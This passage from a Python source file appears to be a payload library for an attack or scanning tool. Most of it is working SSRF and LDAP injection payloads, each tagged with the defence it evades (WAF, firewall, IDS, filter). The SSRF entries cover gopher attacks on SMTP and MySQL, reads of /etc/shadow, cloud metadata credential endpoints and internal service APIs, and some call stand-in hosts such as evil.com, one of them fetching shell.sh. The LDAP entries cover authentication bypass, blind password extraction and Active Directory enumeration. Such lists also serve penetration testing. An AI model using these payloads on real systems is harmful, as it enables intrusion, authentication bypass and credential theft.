            'risk_level': 'critical'
        },
        'ssrf_gopher_smtp': {
            'payload': 'gopher://127.0.0.1:25/HELO%20evil.com%0D%0AMAIL%20FROM%3A%3Cev%40il.com%3E%0D%0ARCPT%20TO%3A%3Cvictim%40target.com%3E%0D%0A',
            'description': 'Gopher SSRF via SMTP',
            'category': PayloadCategory.SSRF,
            'bypass_target': BypassTarget.FIREWALL,
            'risk_level': 'critical'
        },
        'ssrf_gopher_mysql': {
            'payload': 'gopher://127.0.0.1:3306/_%00%00%01%85%a6%0f%00%00%00%00%01%21%00%00%00',
            'description': 'Gopher protocol to attack MySQL',
            'category': PayloadCategory.SSRF,
            'bypass_target': BypassTarget.FIREWALL,
            'risk_level': 'critical'
        },
        # File protocol
        'ssrf_file_passwd': {
            'payload': 'file:///etc/passwd',
            'description': 'SSRF via file protocol for /etc/passwd',
            'category': PayloadCategory.SSRF,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'ssrf_file_shadow': {
            'payload': 'file:///etc/shadow',
            'description': 'SSRF via file protocol for /etc/shadow',
            'category': PayloadCategory.SSRF,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'critical'
        },
        # URL parsing trick bypasses
        'ssrf_at_sign_bypass': {
            'payload': 'http://allowed.com@127.0.0.1/',
            'description': 'SSRF via @ sign URL bypass',
            'category': PayloadCategory.SSRF,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'ssrf_fragment_bypass': {
            'payload': 'http://127.0.0.1#allowed.com',
            'description': 'SSRF via URL fragment bypass',
            'category': PayloadCategory.SSRF,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'ssrf_open_redirect_chain': {
            'payload': 'https://allowed.com/redirect?url=http://127.0.0.1/',
            'description': 'SSRF chained via open redirect',
            'category': PayloadCategory.SSRF,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'critical'
        },
        'ssrf_double_slash': {
            'payload': 'http://127.0.0.1//allowed.com',
            'description': 'SSRF double slash path confusion',
            'category': PayloadCategory.SSRF,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        # Decimal/Hex IP
        'ssrf_decimal_ip': {
            'payload': 'http://2130706433/',
            'description': 'SSRF via decimal notation of 127.0.0.1',
            'category': PayloadCategory.SSRF,
            'bypass_target': BypassTarget.FIREWALL,
            'risk_level': 'high'
        },
        'ssrf_mixed_encoding': {
            'payload': 'http://0177.0.0.0x1/',
            'description': 'SSRF via mixed octal/hex IP',
            'category': PayloadCategory.SSRF,
            'bypass_target': BypassTarget.FIREWALL,
            'risk_level': 'high'
        },
        # Internal services
        'ssrf_internal_elastic': {
            'payload': 'http://127.0.0.1:9200/_cat/indices',
            'description': 'SSRF to internal Elasticsearch',
            'category': PayloadCategory.SSRF,
            'bypass_target': BypassTarget.FIREWALL,
            'risk_level': 'critical'
        },
        'ssrf_internal_memcached': {
            'payload': 'http://127.0.0.1:11211',
            'description': 'SSRF to internal Memcached',
            'category': PayloadCategory.SSRF,
            'bypass_target': BypassTarget.FIREWALL,
            'risk_level': 'high'
        },
        'ssrf_internal_mongodb': {
            'payload': 'http://127.0.0.1:27017',
            'description': 'SSRF to internal MongoDB',
            'category': PayloadCategory.SSRF,
            'bypass_target': BypassTarget.FIREWALL,
            'risk_level': 'critical'
        },
        'ssrf_internal_kubernetes': {
            'payload': 'http://kubernetes.default.svc.cluster.local',
            'description': 'SSRF to Kubernetes API server',
            'category': PayloadCategory.SSRF,
            'bypass_target': BypassTarget.FIREWALL,
            'risk_level': 'critical'
        },
        'ssrf_internal_k8s_api': {
            'payload': 'http://10.96.0.1:443/api/v1/namespaces',
            'description': 'SSRF to Kubernetes API default service IP',
            'category': PayloadCategory.SSRF,
            'bypass_target': BypassTarget.FIREWALL,
            'risk_level': 'critical'
        },
        'ssrf_dns_rebinding': {
            'payload': 'http://rebind.evil.com/',
            'description': 'SSRF via DNS rebinding attack',
            'category': PayloadCategory.SSRF,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'critical'
        },
        'ssrf_302_redirect': {
            'payload': 'http://evil.com/redirect_to_127/',
            'description': 'SSRF via HTTP 302 redirect',
            'category': PayloadCategory.SSRF,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'critical'
        },
        'ssrf_127_alternate': {
            'payload': 'http://127.1/',
            'description': 'SSRF short form of 127.0.0.1',
            'category': PayloadCategory.SSRF,
            'bypass_target': BypassTarget.FIREWALL,
            'risk_level': 'high'
        },
        'ssrf_0_ip': {
            'payload': 'http://0.0.0.0/',
            'description': 'SSRF via 0.0.0.0 resolving to localhost',
            'category': PayloadCategory.SSRF,
            'bypass_target': BypassTarget.FIREWALL,
            'risk_level': 'high'
        },
        'ssrf_172_range': {
            'payload': 'http://172.16.0.1/admin',
            'description': 'SSRF to private 172.16/12 range',
            'category': PayloadCategory.SSRF,
            'bypass_target': BypassTarget.FIREWALL,
            'risk_level': 'high'
        },
        'ssrf_10_range': {
            'payload': 'http://10.0.0.1/admin',
            'description': 'SSRF to private 10.0/8 range',
            'category': PayloadCategory.SSRF,
            'bypass_target': BypassTarget.FIREWALL,
            'risk_level': 'high'
        },
        'ssrf_169_link_local': {
            'payload': 'http://169.254.0.1/',
            'description': 'SSRF to link-local address space',
            'category': PayloadCategory.SSRF,
            'bypass_target': BypassTarget.FIREWALL,
            'risk_level': 'high'
        },
        'ssrf_192_range': {
            'payload': 'http://192.168.0.1/admin',
            'description': 'SSRF to private 192.168/16 range',
            'category': PayloadCategory.SSRF,
            'bypass_target': BypassTarget.FIREWALL,
            'risk_level': 'high'
        },
        'ssrf_100_64_cgnat': {
            'payload': 'http://100.64.0.1/',
            'description': 'SSRF to CGNAT shared address space',
            'category': PayloadCategory.SSRF,
            'bypass_target': BypassTarget.FIREWALL,
            'risk_level': 'medium'
        },
        'ssrf_localhost_word': {
            'payload': 'http://localtest.me/',
            'description': 'SSRF via domain that resolves to 127.0.0.1',
            'category': PayloadCategory.SSRF,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'ssrf_nip_io': {
            'payload': 'http://127.0.0.1.nip.io/',
            'description': 'SSRF via nip.io DNS wildcard service',
            'category': PayloadCategory.SSRF,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'ssrf_xip_io': {
            'payload': 'http://127.0.0.1.xip.io/',
            'description': 'SSRF via xip.io DNS wildcard service',
            'category': PayloadCategory.SSRF,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'ssrf_sslip_io': {
            'payload': 'http://127.0.0.1.sslip.io/',
            'description': 'SSRF via sslip.io DNS wildcard',
            'category': PayloadCategory.SSRF,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'ssrf_ipv6_short': {
            'payload': 'http://[::]:80/admin',
            'description': 'SSRF IPv6 compressed all-zeros',
            'category': PayloadCategory.SSRF,
            'bypass_target': BypassTarget.FIREWALL,
            'risk_level': 'high'
        },
        'ssrf_url_scheme_dict': {
            'payload': 'dict://127.0.0.1:6379/CONFIG GET *',
            'description': 'SSRF via dict:// scheme to Redis',
            'category': PayloadCategory.SSRF,
            'bypass_target': BypassTarget.FIREWALL,
            'risk_level': 'critical'
        },
        'ssrf_url_scheme_ldap': {
            'payload': 'ldap://evil.com/dc=evil,dc=com',
            'description': 'SSRF via ldap:// scheme',
            'category': PayloadCategory.SSRF,
            'bypass_target': BypassTarget.FIREWALL,
            'risk_level': 'critical'
        },
        'ssrf_tftp': {
            'payload': 'tftp://evil.com/shell.sh',
            'description': 'SSRF via tftp:// protocol',
            'category': PayloadCategory.SSRF,
            'bypass_target': BypassTarget.FIREWALL,
            'risk_level': 'critical'
        },
        'ssrf_sftp': {
            'payload': 'sftp://evil.com/evil.txt',
            'description': 'SSRF via sftp:// protocol',
            'category': PayloadCategory.SSRF,
            'bypass_target': BypassTarget.FIREWALL,
            'risk_level': 'high'
        },
        'ssrf_aws_ecs_container': {
            'payload': 'http://169.254.170.2/v2/credentials/',
            'description': 'AWS ECS task credential metadata',
            'category': PayloadCategory.SSRF,
            'bypass_target': BypassTarget.FIREWALL,
            'risk_level': 'critical'
        },
        'ssrf_aws_lambda_env': {
            'payload': 'http://localhost:9001/2018-06-01/runtime/invocation/next',
            'description': 'AWS Lambda runtime API endpoint',
            'category': PayloadCategory.SSRF,
            'bypass_target': BypassTarget.FIREWALL,
            'risk_level': 'critical'
        },
        'ssrf_gcp_kube_env': {
            'payload': 'http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env',
            'description': 'GCP Kubernetes environment metadata',
            'category': PayloadCategory.SSRF,
            'bypass_target': BypassTarget.FIREWALL,
            'risk_level': 'critical'
        },
        'ssrf_azure_managed_identity': {
            'payload': 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/',
            'description': 'Azure managed identity token request',
            'category': PayloadCategory.SSRF,
            'bypass_target': BypassTarget.FIREWALL,
            'risk_level': 'critical'
        },
        'ssrf_internal_consul': {
            'payload': 'http://127.0.0.1:8500/v1/kv/?recurse',
            'description': 'SSRF to Consul KV store',
            'category': PayloadCategory.SSRF,
            'bypass_target': BypassTarget.FIREWALL,
            'risk_level': 'critical'
        },
        'ssrf_internal_etcd': {
            'payload': 'http://127.0.0.1:2379/v2/keys',
            'description': 'SSRF to etcd key-value store',
            'category': PayloadCategory.SSRF,
            'bypass_target': BypassTarget.FIREWALL,
            'risk_level': 'critical'
        },
        'ssrf_internal_docker_api': {
            'payload': 'http://127.0.0.1:2375/v1.41/containers/json',
            'description': 'SSRF to Docker daemon API',
            'category': PayloadCategory.SSRF,
            'bypass_target': BypassTarget.FIREWALL,
            'risk_level': 'critical'
        },
        'ssrf_internal_grafana': {
            'payload': 'http://127.0.0.1:3000/api/datasources',
            'description': 'SSRF to Grafana data sources',
            'category': PayloadCategory.SSRF,
            'bypass_target': BypassTarget.FIREWALL,
            'risk_level': 'high'
        },
        'ssrf_url_confusion': {
            'payload': 'http://127.0.0.1:80%40evil.com/',
            'description': 'SSRF URL confusion with encoded @ sign',
            'category': PayloadCategory.SSRF,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'ssrf_subdomain_embed': {
            'payload': 'http://evil.com.127.0.0.1.nip.io/',
            'description': 'SSRF via embedded IP in subdomain',
            'category': PayloadCategory.SSRF,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'ssrf_host_header_injection': {
            'payload': 'Host: internal-service.local',
            'description': 'SSRF via Host header injection',
            'category': PayloadCategory.SSRF,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'ssrf_localhost_no_dot': {
            'payload': 'http://2130706433:80/',
            'description': 'SSRF via decimal IP 127.0.0.1 no dots',
            'category': PayloadCategory.SSRF,
            'bypass_target': BypassTarget.FIREWALL,
            'risk_level': 'high'
        },
        'ssrf_internal_kibana': {
            'payload': 'http://127.0.0.1:5601/api/saved_objects/_find',
            'description': 'SSRF to Kibana API',
            'category': PayloadCategory.SSRF,
            'bypass_target': BypassTarget.FIREWALL,
            'risk_level': 'high'
        },
        'ssrf_internal_jenkins': {
            'payload': 'http://127.0.0.1:8080/api/json',
            'description': 'SSRF to Jenkins API',
            'category': PayloadCategory.SSRF,
            'bypass_target': BypassTarget.FIREWALL,
            'risk_level': 'critical'
        },
        'ssrf_internal_gitlab': {
            'payload': 'http://127.0.0.1:80/api/v4/users',
            'description': 'SSRF to GitLab internal API',
            'category': PayloadCategory.SSRF,
            'bypass_target': BypassTarget.FIREWALL,
            'risk_level': 'critical'
        },
        'ssrf_internal_prometheus': {
            'payload': 'http://127.0.0.1:9090/api/v1/targets',
            'description': 'SSRF to Prometheus metrics API',
            'category': PayloadCategory.SSRF,
            'bypass_target': BypassTarget.FIREWALL,
            'risk_level': 'high'
        },
        'ssrf_cloud_oracle': {
            'payload': 'http://192.0.0.192/opc/v2/instance/',
            'description': 'Oracle Cloud IMDS endpoint',
            'category': PayloadCategory.SSRF,
            'bypass_target': BypassTarget.FIREWALL,
            'risk_level': 'critical'
        },
        'ssrf_ibm_cloud': {
            'payload': 'http://169.254.169.254/metadata/v1/maintenance',
            'description': 'IBM Cloud instance metadata',
            'category': PayloadCategory.SSRF,
            'bypass_target': BypassTarget.FIREWALL,
            'risk_level': 'critical'
        },
        'ssrf_alibaba_metadata': {
            'payload': 'http://100.100.100.200/latest/meta-data/',
            'description': 'Alibaba Cloud ECS metadata service',
            'category': PayloadCategory.SSRF,
            'bypass_target': BypassTarget.FIREWALL,
            'risk_level': 'critical'
        },
        'ssrf_aws_token_imdsv2': {
            'payload': 'X-aws-ec2-metadata-token: TOKEN_HERE',
            'description': 'AWS IMDSv2 token header for metadata access',
            'category': PayloadCategory.SSRF,
            'bypass_target': BypassTarget.FIREWALL,
            'risk_level': 'critical'
        },
        'ssrf_bypass_127_dot_1': {
            'payload': 'http://127.0.0.0/admin',
            'description': 'SSRF via 127.0.0.0 network address',
            'category': PayloadCategory.SSRF,
            'bypass_target': BypassTarget.FIREWALL,
            'risk_level': 'high'
        },
        'ssrf_bypass_localhost_upper': {
            'payload': 'http://LOCALHOST/admin',
            'description': 'SSRF via uppercase LOCALHOST',
            'category': PayloadCategory.SSRF,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'ssrf_bypass_mixed_case': {
            'payload': 'http://LoCaLhOsT/admin',
            'description': 'SSRF via mixed case localhost',
            'category': PayloadCategory.SSRF,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'ssrf_bypass_url_double_encode': {
            'payload': 'http://127%252E0%252E0%252E1/admin',
            'description': 'SSRF via double-encoded dots in IP',
            'category': PayloadCategory.SSRF,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'ssrf_bypass_encoded_slash': {
            'payload': 'http://127.0.0.1%2F@evil.com/',
            'description': 'SSRF bypass with encoded slash in path',
            'category': PayloadCategory.SSRF,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        }
    }

    # LDAP Injection Payloads
    LDAP_PAYLOADS = {
        # Authentication bypass
        'ldap_auth_bypass_star': {
            'payload': '*',
            'description': 'LDAP wildcard authentication bypass',
            'category': PayloadCategory.LDAP,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'critical'
        },
        'ldap_auth_bypass_or': {
            'payload': '*(|(password=*))',
            'description': 'LDAP OR injection auth bypass',
            'category': PayloadCategory.LDAP,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'critical'
        },
        'ldap_auth_bypass_admin': {
            'payload': 'admin)(&)',
            'description': 'LDAP admin bypass with injected filter',
            'category': PayloadCategory.LDAP,
            'bypass_target': BypassTarget.ALL,
            'risk_level': 'critical'
        },
        'ldap_auth_bypass_close': {
            'payload': 'admin)(&(password=*))',
            'description': 'LDAP close bracket injection',
            'category': PayloadCategory.LDAP,
            'bypass_target': BypassTarget.ALL,
            'risk_level': 'critical'
        },
        'ldap_auth_null': {
            'payload': '\x00',
            'description': 'LDAP null byte injection',
            'category': PayloadCategory.LDAP,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'critical'
        },
        'ldap_auth_bypass_not': {
            'payload': '!(objectClass=user))(|(cn=*',
            'description': 'LDAP NOT filter bypass',
            'category': PayloadCategory.LDAP,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'critical'
        },
        # Filter manipulation
        'ldap_filter_wildcard': {
            'payload': '(cn=*)',
            'description': 'LDAP wildcard to return all users',
            'category': PayloadCategory.LDAP,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'ldap_filter_or_all': {
            'payload': '(|(cn=admin)(cn=*))',
            'description': 'LDAP OR filter to match all',
            'category': PayloadCategory.LDAP,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'ldap_filter_and_bypass': {
            'payload': '(&(cn=admin)(|(password=*))',
            'description': 'LDAP AND filter bypass',
            'category': PayloadCategory.LDAP,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'ldap_filter_inject_or': {
            'payload': 'test)(|(cn=*',
            'description': 'LDAP OR filter injection',
            'category': PayloadCategory.LDAP,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'critical'
        },
        'ldap_filter_true': {
            'payload': '*)(&',
            'description': 'LDAP injection making filter always true',
            'category': PayloadCategory.LDAP,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'critical'
        },
        'ldap_filter_close_inject': {
            'payload': 'x)(cn=*',
            'description': 'LDAP closing bracket injection',
            'category': PayloadCategory.LDAP,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'critical'
        },
        # Data extraction (blind LDAP)
        'ldap_blind_first_char': {
            'payload': '(cn=a*)',
            'description': 'Blind LDAP - check first character',
            'category': PayloadCategory.LDAP,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'ldap_blind_password_start': {
            'payload': '(userPassword=a*)',
            'description': 'Blind LDAP password extraction first char',
            'category': PayloadCategory.LDAP,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'ldap_blind_enum_users': {
            'payload': '(|(uid=admin)(uid=root)(uid=test)(uid=guest))',
            'description': 'LDAP user enumeration via OR filter',
            'category': PayloadCategory.LDAP,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'ldap_extract_dn': {
            'payload': '*)(objectClass=*)',
            'description': 'LDAP DN extraction via object class',
            'category': PayloadCategory.LDAP,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'ldap_extract_all_attrs': {
            'payload': '(objectClass=*)',
            'description': 'LDAP extract all objects',
            'category': PayloadCategory.LDAP,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'ldap_extract_users': {
            'payload': '(objectClass=user)',
            'description': 'LDAP enumerate all user objects',
            'category': PayloadCategory.LDAP,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'ldap_extract_groups': {
            'payload': '(objectClass=group)',
            'description': 'LDAP enumerate all groups',
            'category': PayloadCategory.LDAP,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'ldap_extract_admin_group': {
            'payload': '(cn=admin*)',
            'description': 'LDAP search for admin group',
            'category': PayloadCategory.LDAP,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        # Special character injections
        'ldap_special_paren': {
            'payload': 'test)(cn=test',
            'description': 'LDAP unbalanced parenthesis injection',
            'category': PayloadCategory.LDAP,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'ldap_special_backslash': {
            'payload': 'test\\29test',
            'description': 'LDAP backslash hex encoding of )',
            'category': PayloadCategory.LDAP,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'medium'
        },
        'ldap_special_asterisk_encoded': {
            'payload': '\\2a',
            'description': 'LDAP encoded asterisk wildcard',
            'category': PayloadCategory.LDAP,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'medium'
        },
        # Active Directory specific
        'ldap_ad_members': {
            'payload': '(memberOf=CN=Domain Admins,CN=Users,DC=domain,DC=com)',
            'description': 'LDAP AD domain admins enumeration',
            'category': PayloadCategory.LDAP,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'ldap_ad_sam_account': {
            'payload': '(sAMAccountName=*)',
            'description': 'LDAP AD SAM account enumeration',
            'category': PayloadCategory.LDAP,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'ldap_ad_spn': {
            'payload': '(servicePrincipalName=*)',
            'description': 'LDAP AD SPN enumeration for Kerberoasting',
            'category': PayloadCategory.LDAP,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'ldap_ad_admin_count': {
            'payload': '(&(objectClass=user)(adminCount=1))',
            'description': 'LDAP AD privileged users via adminCount',
            'category': PayloadCategory.LDAP,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        # Injection in login forms
        'ldap_login_user_bypass': {
            'payload': 'admin*)',
            'description': 'LDAP login wildcard after username',
            'category': PayloadCategory.LDAP,
            'bypass_target': BypassTarget.ALL,
            'risk_level': 'critical'
        },
        'ldap_login_always_true': {
            'payload': '*)(&(password=anything',
            'description': 'LDAP login always-true injection',
            'category': PayloadCategory.LDAP,
            'bypass_target': BypassTarget.ALL,
            'risk_level': 'critical'
        },
        'ldap_login_comment': {
            'payload': 'admin)(|(cn=*)',
            'description': 'LDAP login comment-style injection',
            'category': PayloadCategory.LDAP,
            'bypass_target': BypassTarget.ALL,
            'risk_level': 'critical'
        },
        # Combined payloads
        'ldap_combined_or_and': {
            'payload': '(|(cn=admin)(&(objectClass=person)(cn=*))',
            'description': 'LDAP combined OR AND filter injection',
            'category': PayloadCategory.LDAP,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'ldap_time_delay_search': {
            'payload': '(|(objectClass=*)(objectClass=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx))',
            'description': 'LDAP time-delay search via large filter',
            'category': PayloadCategory.LDAP,
            'bypass_target': BypassTarget.IDS,
            'risk_level': 'medium'
        },
        'ldap_inject_scope': {
            'payload': 'dc=evil,dc=com',
            'description': 'LDAP scope injection to change search base',
            'category': PayloadCategory.LDAP,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'ldap_encoded_null': {
            'payload': '\\00',
            'description': 'LDAP encoded null byte',
            'category': PayloadCategory.LDAP,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'medium'
        },
        'ldap_objectsid_extract': {
            'payload': '(objectSid=*)',
            'description': 'LDAP extract object SIDs (Windows)',
            'category': PayloadCategory.LDAP,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'ldap_extract_password_hash': {
            'payload': '(|(userPassword={SSHA}*)(userPassword={SHA}*)(userPassword={MD5}*))',
            'description': 'LDAP enumerate hashed passwords by type',
            'category': PayloadCategory.LDAP,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'ldap_openldap_rootdse': {
            'payload': '(objectClass=*)',
            'description': 'OpenLDAP rootDSE query',
            'category': PayloadCategory.LDAP,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'info'
        },
        'ldap_true_condition': {
            'payload': '(&(objectClass=user)(uid=*))',
            'description': 'LDAP true condition for all users',
            'category': PayloadCategory.LDAP,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'ldap_waf_unicode': {
            'payload': '\uff0a',
            'description': 'LDAP Unicode fullwidth asterisk bypass',
            'category': PayloadCategory.LDAP,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'medium'
        },
        'ldap_newline_inject': {
            'payload': 'admin\n(&(objectClass=*)',
            'description': 'LDAP newline injection',
            'category': PayloadCategory.LDAP,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'critical'
        },
        'ldap_cr_inject': {
            'payload': 'admin\r(&(objectClass=*)',
            'description': 'LDAP carriage return injection',
            'category': PayloadCategory.LDAP,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'critical'
        },
        'ldap_dn_inject': {
            'payload': 'cn=admin,dc=test,dc=com)(|(cn=*',
            'description': 'LDAP DN injection',
            'category': PayloadCategory.LDAP,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'critical'
        },
        'ldap_escaped_special': {
            'payload': '\\28\\2a\\29',
            'description': 'LDAP hex-escaped special chars ()*',
            'category': PayloadCategory.LDAP,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'low'
        },
        'ldap_posix_group': {
            'payload': '(&(objectClass=posixGroup)(cn=*))',
            'description': 'LDAP POSIX group enumeration',
            'category': PayloadCategory.LDAP,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'ldap_mail_extract': {
            'payload': '(mail=*@*)',
            'description': 'LDAP email address extraction',
            'category': PayloadCategory.LDAP,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'ldap_uid_extract': {
            'payload': '(uid=*)',
            'description': 'LDAP extract all UIDs',
            'category': PayloadCategory.LDAP,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'ldap_description_extract': {
            'payload': '(description=*password*)',
            'description': 'LDAP search descriptions containing password',
            'category': PayloadCategory.LDAP,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'ldap_modify_inject': {
            'payload': 'test)(|(objectClass=*)',
            'description': 'LDAP inject into modify operation',
            'category': PayloadCategory.LDAP,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'critical'
        },
        'ldap_compare_bypass': {
            'payload': '(userPassword:1.2.840.113556.1.4.1941:=password)',
            'description': 'LDAP extensible match for password comparison',
            'category': PayloadCategory.LDAP,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'ldap_approx_match': {
            'payload': '(cn~=admin)',
            'description': 'LDAP approximate match operator',
            'category': PayloadCategory.LDAP,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'medium'
        },
        'ldap_less_equal': {
            'payload': '(uidNumber<=0)',
            'description': 'LDAP less-than-or-equal numeric match',
            'category': PayloadCategory.LDAP,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'medium'
        },
        'ldap_greater_equal': {
            'payload': '(uidNumber>=0)',
            'description': 'LDAP greater-than-or-equal match all UIDs',
            'category': PayloadCategory.LDAP,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'medium'
        },
        'ldap_nested_or': {
            'payload': '(|(cn=admin)(|(uid=root)(|(mail=*)))',
            'description': 'LDAP deeply nested OR filter',
            'category': PayloadCategory.LDAP,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'ldap_user_object_class': {
            'payload': '(&(objectClass=inetOrgPerson)(uid=*))',
            'description': 'LDAP inetOrgPerson class enumeration',
            'category': PayloadCategory.LDAP,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'ldap_organizational_unit': {
            'payload': '(ou=*)',
            'description': 'LDAP enumerate organizational units',
            'category': PayloadCategory.LDAP,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'medium'
        },
        'ldap_gecos_field': {
            'payload': '(gecos=*password*)',
            'description': 'LDAP GECOS field password search',
            'category': PayloadCategory.LDAP,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'ldap_home_dir': {
            'payload': '(homeDirectory=*)',
            'description': 'LDAP enumerate user home directories',
            'category': PayloadCategory.LDAP,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'medium'
        },
        'ldap_telephone': {
            'payload': '(telephoneNumber=*)',
            'description': 'LDAP phone number extraction',
            'category': PayloadCategory.LDAP,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'low'
        },
        'ldap_ad_user_account_control': {
            'payload': '(&(objectCategory=person)(userAccountControl:1.2.840.113556.1.4.803:=2))',
            'description': 'LDAP AD disabled accounts enumeration',
            'category': PayloadCategory.LDAP,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'medium'
        },
        'ldap_ad_locked': {
            'payload': '(&(objectCategory=person)(lockoutTime>=1))',
            'description': 'LDAP AD locked accounts',
            'category': PayloadCategory.LDAP,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'medium'
        },
        'ldap_ad_never_expire': {
            'payload': '(&(objectCategory=person)(userAccountControl:1.2.840.113556.1.4.803:=65536))',
            'description': 'LDAP AD password never expires accounts',
            'category': PayloadCategory.LDAP,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'ldap_ad_password_not_required': {
            'payload': '(&(objectCategory=person)(userAccountControl:1.2.840.113556.1.4.803:=32))',
            'description': 'LDAP AD password not required accounts',
            'category': PayloadCategory.LDAP,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'ldap_guid_extract': {
            'payload': '(objectGUID=*)',
            'description': 'LDAP object GUID extraction',
            'category': PayloadCategory.LDAP,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'low'
        },
        'ldap_exchange_email': {
            'payload': '(proxyAddresses=smtp:*)',
            'description': 'LDAP Exchange proxy addresses',
            'category': PayloadCategory.LDAP,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'medium'
        },
        'ldap_manager_attr': {
            'payload': '(manager=*)',
            'description': 'LDAP management hierarchy extraction',
            'category': PayloadCategory.LDAP,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'low'
        },
        'ldap_combined_bypass_v2': {
            'payload': 'admin*))(|(uid=*',
            'description': 'LDAP complex bypass closing and injecting',
            'category': PayloadCategory.LDAP,
            'bypass_target': BypassTarget.ALL,
            'risk_level': 'critical'
        },
        'ldap_not_filter_bypass': {
            'payload': '(!(cn=test))',
            'description': 'LDAP NOT filter to bypass specific restrictions',
            'category': PayloadCategory.LDAP,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'ldap_binary_octet': {
            'payload': '(userPassword=\\61\\64\\6d\\69\\6e)',
            'description': 'LDAP binary octet-encoded string injection',
            'category': PayloadCategory.LDAP,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'ldap_attribute_escape_bypass': {
            'payload': 'user\\2a)(|(uid=\\2a',
            'description': 'LDAP hex-escape to bypass wildcard filter',
            'category': PayloadCategory.LDAP,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
